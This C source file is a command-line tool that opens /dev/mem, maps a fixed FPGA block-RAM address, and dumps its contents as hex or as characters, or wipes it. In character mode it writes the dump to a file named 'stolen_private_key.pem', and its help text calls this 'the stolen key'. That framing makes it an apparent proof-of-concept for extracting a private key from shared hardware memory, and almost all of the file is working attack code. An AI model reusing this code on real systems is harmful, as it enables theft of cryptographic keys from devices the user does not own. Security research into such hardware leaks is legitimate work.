#include <stdio.h>
#include <stdlib.h>
#include <fcntl.h>
#include <unistd.h>
#include <sys/mman.h>

#define SIZE_KEY        0x6A0   // Key size
#define OFFSET          0x10    // 4 addresses (the key starts at BRAM_base + 0x10)
#define WORD_SIZE       4       // 4 bytes
#define OFFSET_WORDS    4       // 4 addresses (the key starts at BRAM_base + 0x10)
#define BRAM_BASE       0x80012000

int print_hex() {
    int mem_fd;
    uint phy_addr = BRAM_BASE;
    int *map_base;

    // Open /dev/mem to access physical memory
    mem_fd = open("/dev/mem", O_RDWR | O_SYNC);
    if (mem_fd == -1) {
        perror("Error opening /dev/mem");
        exit(1);
    }

    // Map physical memory into user space
    map_base = mmap(NULL, 4096, PROT_READ | PROT_WRITE, MAP_SHARED, mem_fd, phy_addr);
    if (map_base == MAP_FAILED) {
        perror("mmap() failed");
        close(mem_fd);
        exit(1);
    }

    // Read BRAM [base+0x10:base+SIZE_KEY/4+0x10]
    // Ignore firs 4 addresses
    for (int i = OFFSET_WORDS; i <= SIZE_KEY/WORD_SIZE+OFFSET_WORDS*2 ; i++)
    {   
        printf("0x%08x: 0x%08x\n", phy_addr+i*4, *(map_base+i));
    }

    // Unmap memory and close /dev/mem
    munmap(map_base, 4096);
    close(mem_fd);

    return 0;
}

int print_char() {
    int mem_fd;
    uint phy_addr = BRAM_BASE;
    unsigned char *map_base;

    // Open /dev/mem to access physical memory
    mem_fd = open("/dev/mem", O_RDWR | O_SYNC);
    if (mem_fd == -1) {
        perror("Error opening /dev/mem");
        exit(1);
    }

    // Map physical memory into user space
    map_base = mmap(NULL, 4096, PROT_READ | PROT_WRITE, MAP_SHARED, mem_fd, phy_addr);
    if (map_base == MAP_FAILED) {
        perror("mmap() failed");
        close(mem_fd);
        exit(1);
    }

    FILE *dummy = fopen("dummy", "w");
    FILE *output_file = fopen("stolen_private_key.pem", "w");
    if (output_file == NULL) {
        perror("Error opening output file");
        munmap(map_base, 4096);
        close(mem_fd);
        exit(1);
    }

    // Print the content to the file
    // Read BRAM [base+0x10:base+SIZE_KEY/4+0x10] -> Ignore firs 4 addresses
    for (int i = OFFSET-4; i <= SIZE_KEY+OFFSET*2 ; i++) {
        // I need to do first a dummy access for the next print/fprint to be correct
        // Don't know exactly why, but maybe it's because some mmap "cache issue"
        fprintf(dummy, "%c", *(map_base+i)); 
        printf("%c", *(map_base+i));
        fprintf(output_file, "%c", *(map_base+i)); 
    }

    fclose(output_file);

    // Unmap memory and close /dev/mem
    munmap(map_base, 4096);
    close(mem_fd);
    
    return 0;
}

// Function to clean the BRAM memory
int clean_bram() {
    int mem_fd;
    uint phy_addr = BRAM_BASE;
    int *map_base;

    // Open /dev/mem to access physical memory
    mem_fd = open("/dev/mem", O_RDWR | O_SYNC);
    if (mem_fd == -1) {
        perror("Error opening /dev/mem");
        exit(1);
    }

    // Map physical memory into user space
    map_base = mmap(NULL, 4096, PROT_READ | PROT_WRITE, MAP_SHARED, mem_fd, phy_addr);
    if (map_base == MAP_FAILED) {
        perror("mmap() failed");
        close(mem_fd);
        exit(1);
    }

    // Clean BRAM [base:base+SIZE_KEY/4]
    for (int i = 0; i <= SIZE_KEY/WORD_SIZE + 8; i++) {
        *(map_base+i) = 0x0;
    }

    // Unmap memory and close /dev/mem
    munmap(map_base, 4096);
    close(mem_fd);
    
    return 0;
} 



int main(int argc, char *argv[]) {
    if (argc < 2 || strcmp(argv[1], "-h") == 0) {
        printf("Usage: %s -cmd [c/hex/char]\n", argv[0]);
        printf("Options:\n");
        printf("  -cmd c    Clear BRAM\n");
        printf("  -cmd hex  Print BRAM content in hexadecimal format\n");
        printf("  -cmd char Print BRAM content as characters & create a file (\n");
        printf("            stolen_private_key.pem with the stolen key\n");
        return 1;
    }

    if (strcmp(argv[1], "-cmd") == 0) {
        if (argc < 3) {
            printf("Usage: %s -cmd [c/hex/char]\n", argv[0]);
            printf("Options:\n");
            printf("  -cmd c    Clear BRAM\n");
            printf("  -cmd hex  Print BRAM content in hexadecimal format\n");
            printf("  -cmd char Print BRAM content as characters & create a file (\n");
            printf("            stolen_private_key.pem with the stolen key\n");
            return 1;
        }
        if (strcmp(argv[2], "c") == 0) {
            clean_bram();
            printf("BRAM cleaned\n");
        } else if (strcmp(argv[2], "hex") == 0) {
            print_hex();
        } else if (strcmp(argv[2], "char") == 0) {
            print_char();
        } else {
            printf("Invalid command: %s\n", argv[2]);
            return 1;
        }
    } else {
        printf("Invalid option: %s\n", argv[1]);
        return 1;
    }
    return 0;
}